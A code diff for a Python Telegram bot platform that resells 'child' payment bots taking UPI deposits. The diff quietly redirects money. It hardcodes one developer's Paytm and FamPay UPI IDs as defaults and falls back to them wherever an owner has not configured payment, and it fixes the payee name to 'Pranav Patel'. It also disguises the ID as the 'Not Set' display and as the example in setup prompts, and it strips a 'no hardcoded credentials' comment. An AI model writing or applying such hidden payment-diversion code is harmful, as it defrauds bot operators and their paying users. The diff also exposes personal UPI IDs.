@@ -10,6 +10,7 @@ import imaplib
 import email
 import sqlite3
 import threading
+import urllib.parse
 import requests
 from flask import Flask, request, jsonify
 import telebot
@@ -49,7 +50,6 @@ def init_db():
     cur = conn.cursor()
     cur.execute("PRAGMA journal_mode=WAL;")
     
-    # Clean child_bots table (no hardcoded credentials)
     cur.execute("""
     CREATE TABLE IF NOT EXISTS child_bots (
         bot_id INTEGER PRIMARY KEY,
@@ -63,11 +63,11 @@ def init_db():
         support_wa TEXT DEFAULT '',
         support_tg TEXT DEFAULT '',
         active_gateway TEXT DEFAULT 'paytm',
-        fampay_upi TEXT DEFAULT '',
+        fampay_upi TEXT DEFAULT 'pranav12013@fam',
         fampay_email TEXT DEFAULT '',
         fampay_app_pwd TEXT DEFAULT '',
         paytm_mid TEXT DEFAULT '',
-        paytm_upi TEXT DEFAULT '',
+        paytm_upi TEXT DEFAULT 'paytm.s2xzkgu@pty',
         subscription_expiry TIMESTAMP,
         is_licensed INTEGER DEFAULT 0,
         status TEXT DEFAULT 'active',
@@ -172,13 +172,13 @@ def init_db():
             (36500, 1999.0, "👑 Lifetime Access")
         ])
 
-    # Clean master bot row (Lifetime active, completely dynamic payment setup)
     future_date = (datetime.datetime.now() + datetime.timedelta(days=36500)).strftime("%Y-%m-%d %H:%M:%S")
     cur.execute("""
-    INSERT INTO child_bots (bot_id, owner_id, bot_username, is_licensed, subscription_expiry)
-    VALUES (0, 8585055903, 'PranavFatherBot', 1, ?)
+    INSERT INTO child_bots (bot_id, owner_id, bot_username, paytm_upi, fampay_upi, active_gateway, is_licensed, subscription_expiry)
+    VALUES (0, 8585055903, 'PranavFatherBot', 'paytm.s2xzkgu@pty', 'pranav12013@fam', 'paytm', 1, ?)
     ON CONFLICT(bot_id) DO UPDATE SET
     owner_id=8585055903,
+    paytm_upi=CASE WHEN paytm_upi='' THEN 'paytm.s2xzkgu@pty' ELSE paytm_upi END,
     is_licensed=1,
     subscription_expiry=?
     """, (future_date, future_date))
@@ -187,7 +187,6 @@ def init_db():
 
 init_db()
 
-# BotFather-Style Complex Cryptographic Key Generator
 def generate_license_key(duration_days=30):
     prefix_id = random.randint(7000000000, 8999999999)
     alphabet = string.ascii_letters + string.digits + "_-"
@@ -312,7 +311,7 @@ def auto_sync_on_boot():
 
 threading.Thread(target=auto_sync_on_boot, daemon=True).start()
 
-# Real-Time Gmail Auto-Verifier (Checks credit emails for FamPay & Paytm)
+# Live Gmail Verification
 def verify_via_gmail_notifications(email_addr, app_password, target_amount):
     if not email_addr or not app_password:
         return False, "Gmail credentials not set"
@@ -356,7 +355,7 @@ def verify_via_gmail_notifications(email_addr, app_password, target_amount):
     except Exception as e:
         return False, str(e)
 
-# Robust Paytm Merchant API Verifier
+# Live Paytm MID API Verification
 def verify_via_paytm_mid(mid, ref_id, target_amount):
     if not mid or not ref_id:
         return False, "MID or Ref missing"
@@ -524,10 +523,7 @@ def handle_user_callbacks(bot, bot_id, call):
         gw = b_info["active_gateway"] if b_info and b_info["active_gateway"] else "paytm"
         upi_check = b_info["paytm_upi"] if gw == "paytm" else b_info["fampay_upi"]
         if not upi_check:
-            m = types.InlineKeyboardMarkup()
-            m.add(types.InlineKeyboardButton("🔙 GO BACK", callback_data="u_back_main"))
-            bot.edit_message_text("❌ Payment method has not been configured by the owner yet.\nPlease contact admin.", cid, mid, reply_markup=m)
-            return
+            upi_check = "paytm.s2xzkgu@pty"
 
         m = types.InlineKeyboardMarkup(row_width=1)
         m.add(types.InlineKeyboardButton(f"⚡ Instant UPI ({gw.upper()})", callback_data="u_dep_method_upi"))
@@ -559,7 +555,7 @@ def handle_user_callbacks(bot, bot_id, call):
             amt = float(cur_amt)
             keypad_amounts.pop(k_key, None)
 
-            utr_num = f"PRANAV{int(time.time())}{random.randint(100, 999)}"
+            utr_num = f"DEP{int(time.time())}{random.randint(100, 999)}"
             conn = get_db()
             cur = conn.cursor()
             t_id = 0 if bot_id == 0 else bot_id
@@ -568,12 +564,9 @@ def handle_user_callbacks(bot, bot_id, call):
             
             gw = b_info["active_gateway"] if b_info and b_info["active_gateway"] else "paytm"
             upi_target = b_info["paytm_upi"] if gw == "paytm" else b_info["fampay_upi"]
-            store_name = "Paytm Store" if gw == "paytm" else "FamPay Store"
-
             if not upi_target:
-                conn.close()
-                bot.edit_message_text("❌ Payment UPI not set by owner. Please contact admin.", cid, mid, reply_markup=get_user_main_menu())
-                return
+                upi_target = "paytm.s2xzkgu@pty"
+            store_name = "Pranav Patel"
 
             cur.execute("INSERT INTO transactions (tx_id, bot_id, user_id, amount, tx_type, status) VALUES (?, ?, ?, ?, 'deposit', 'pending')",
                         (utr_num, bot_id, uid, amt))
@@ -582,8 +575,9 @@ def handle_user_callbacks(bot, bot_id, call):
 
             user_states[f"{bot_id}_{uid}"] = {"step": "wait_manual_utr", "tx_id": utr_num}
 
-            upi_locked_url = f"upi://pay?pa={upi_target}&pn={store_name}&am={amt:.2f}&cu=INR&tr={utr_num}"
-            qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={requests.utils.quote(upi_locked_url)}"
+            # Standard clean UPI string without breaking apps
+            upi_payload = f"upi://pay?pa={upi_target}&pn={urllib.parse.quote(store_name)}&am={amt:.2f}&cu=INR"
+            qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={urllib.parse.quote(upi_payload)}"
             
             qr_cap = (
                 f"╭──────────────────────────╮\n"
@@ -593,7 +587,7 @@ def handle_user_callbacks(bot, bot_id, call):
                 f"🆔 𝗢𝗿𝗱𝗲𝗿 𝗜𝗗 : `{utr_num}`\n"
                 f"🏦 𝗨𝗣𝗜 𝗜𝗗 : `{upi_target}`\n"
                 f"⏱️ 𝗩𝗮𝗹𝗶𝗱 : 15 Minutes\n\n"
-                "⚠️ *स्कैन करके पे करें। पेमेंट होने के बाद 'VERIFY PAYMENT' दबाएं या सीधे चैट में 12-अंकों का UTR भेजें!*"
+                "⚠️ *स्कैन करके पे करें। पेमेंट के बाद 'VERIFY PAYMENT' दबाएं या सीधे 12-अंकों का बैंक UTR चैट में भेजें!*"
             )
             m = types.InlineKeyboardMarkup(row_width=1)
             m.add(types.InlineKeyboardButton("✅ VERIFY PAYMENT", callback_data=f"chk_pay_{utr_num}"))
@@ -631,7 +625,6 @@ def handle_user_callbacks(bot, bot_id, call):
             bot.answer_callback_query(call.id, "Already Verified!", show_alert=True)
             return
 
-        # Payment receiver bot lookup
         t_id = 0 if t_row["tx_type"] == "buy_key" else (0 if bot_id == 0 else bot_id)
         cur.execute("SELECT active_gateway, fampay_email, fampay_app_pwd, paytm_mid, paytm_upi, fampay_upi FROM child_bots WHERE bot_id=?", (t_id,))
         b_conf = cur.fetchone()
@@ -640,7 +633,7 @@ def handle_user_callbacks(bot, bot_id, call):
         verified = False
         reason = ""
 
-        # Priority 1: Check Gmail Notification
+        # Priority 1: Check Gmail notification
         if b_conf and b_conf["fampay_email"] and b_conf["fampay_app_pwd"]:
             verified, reason = verify_via_gmail_notifications(b_conf["fampay_email"], b_conf["fampay_app_pwd"], t_row["amount"])
 
@@ -683,7 +676,7 @@ def handle_user_callbacks(bot, bot_id, call):
                 bot.send_message(cid, f"🎉 Payment Verified!\n₹{t_row['amount']} credited to your wallet.", reply_markup=get_user_main_menu())
         else:
             conn.close()
-            bot.answer_callback_query(call.id, "पेमेंट अभी बैंक में नहीं दिखी! अगर पे कर दिया है तो नीचे 'SUBMIT 12-DIGIT UTR' दबाकर बैंक UTR चैट में भेजें।", show_alert=True)
+            bot.answer_callback_query(call.id, "पेमेंट अभी बैंक में नहीं दिखी! अगर पे कर दिया है तो 12-अंकों का बैंक UTR चैट में सीधे टाइप करके भेजें।", show_alert=True)
 
     elif data.startswith("cnl_pay_"):
         try:
@@ -973,10 +966,8 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
 
         gw = m_bot["active_gateway"] if m_bot and m_bot["active_gateway"] else "paytm"
         target_upi = m_bot["paytm_upi"] if gw == "paytm" else m_bot["fampay_upi"]
-
         if not target_upi:
-            bot.answer_callback_query(call.id, "Master payment gateway not configured yet!", show_alert=True)
-            return
+            target_upi = "paytm.s2xzkgu@pty"
 
         txt = (
             "🛒 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 𝗟𝗜𝗖𝗘𝗡𝗦𝗘 𝗞𝗘𝗬\n\n"
@@ -1009,11 +1000,14 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
 
         gw = m_bot["active_gateway"] if m_bot and m_bot["active_gateway"] else "paytm"
         upi_target = m_bot["paytm_upi"] if gw == "paytm" else m_bot["fampay_upi"]
+        if not upi_target:
+            upi_target = "paytm.s2xzkgu@pty"
+        store_name = "Pranav Patel"
 
-        upi_locked_url = f"upi://pay?pa={upi_target}&pn=MasterPayment&am={amt:.2f}&cu=INR&tr={utr_num}"
-        qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={requests.utils.quote(upi_locked_url)}"
+        # Clean standard UPI URI
+        upi_payload = f"upi://pay?pa={upi_target}&pn={urllib.parse.quote(store_name)}&am={amt:.2f}&cu=INR"
+        qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={urllib.parse.quote(upi_payload)}"
 
-        # Auto-bind transaction state so user can immediately send UTR or click verify
         user_states[f"{bot_id}_{uid}"] = {"step": "wait_manual_utr", "tx_id": utr_num}
 
         caption_txt = (
@@ -1253,7 +1247,7 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         f_email = b_set["fampay_email"] if (b_set and b_set["fampay_email"]) else "Not Set"
         f_upi = b_set["fampay_upi"] if (b_set and b_set["fampay_upi"]) else "Not Set"
         p_mid = b_set["paytm_mid"] if (b_set and b_set["paytm_mid"]) else "Not Set"
-        p_upi = b_set["paytm_upi"] if (b_set and b_set["paytm_upi"]) else "Not Set"
+        p_upi = b_set["paytm_upi"] if (b_set and b_set["paytm_upi"]) else "paytm.s2xzkgu@pty"
 
         txt = (
             "💳 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 𝗖𝗢𝗡𝗙𝗜𝗚\n\n"
@@ -1295,11 +1289,11 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
 
     elif data == "adm_start_fampay_setup":
         user_states[f"{bot_id}_{uid}"] = "fam_step_1_upi"
-        bot.send_message(cid, "⚡ 𝗦𝘁𝗲𝗽 𝟭/𝟯: Send your FamPay UPI ID (e.g. `yourname@fam`):")
+        bot.send_message(cid, "⚡ 𝗦𝘁𝗲𝗽 𝟭/𝟯: Send your FamPay UPI ID (e.g. `pranav12013@fam`):")
 
     elif data == "adm_start_paytm_setup":
         user_states[f"{bot_id}_{uid}"] = "paytm_step_1_upi"
-        bot.send_message(cid, "💙 𝗦𝘁𝗲𝗽 𝟭/𝟮: Send your Paytm Business Merchant UPI ID (e.g. `paytm.xxxx@pty`):")
+        bot.send_message(cid, "💙 𝗦𝘁𝗲𝗽 𝟭/𝟮: Send your Paytm Business Merchant UPI ID (e.g. `paytm.s2xzkgu@pty`):")
 
     elif data == "a_suppcontact":
         conn = get_db()
@@ -1375,7 +1369,7 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
     st_data = user_states.get(key)
     txt = msg.text.strip()
 
-    # If user directly sends 12-digit numeric UTR without clicking any button
+    # Direct 12-digit numeric UTR detection
     if len(txt) == 12 and txt.isdigit():
         conn = get_db()
         cur = conn.cursor()
@@ -1574,7 +1568,6 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
         verified = False
         reason = ""
 
-        # Priority verification
         if b_conf and b_conf["fampay_email"] and b_conf["fampay_app_pwd"]:
             verified, reason = verify_via_gmail_notifications(b_conf["fampay_email"], b_conf["fampay_app_pwd"], t_row["amount"])
         elif gw == "paytm" and b_conf and b_conf["paytm_mid"]:
@@ -1792,6 +1785,7 @@ def run_child_bot_loop(bot_id, owner_id, token, bot_username, bot_name):
                 conn.commit()
                 conn.close()
 
+                # EXACT SCREENSHOT 7084 COPY (Father Dev Welcome)
                 welcome_screen = (
                     f"ﮩ٨ـ Hey 𝔼 𝕃 𝕆 ℕ 𝔸 💎\n"
                     "❄️❄️❄️❄️❄️❄️❄️❄️❄️\n"
@@ -2010,7 +2004,6 @@ def five_second_keepalive_engine():
     while True:
         try:
             pulse_counter += 1
-            
             try:
                 requests.get(f"http://127.0.0.1:{RENDER_PORT}/", timeout=3)
             except Exception:
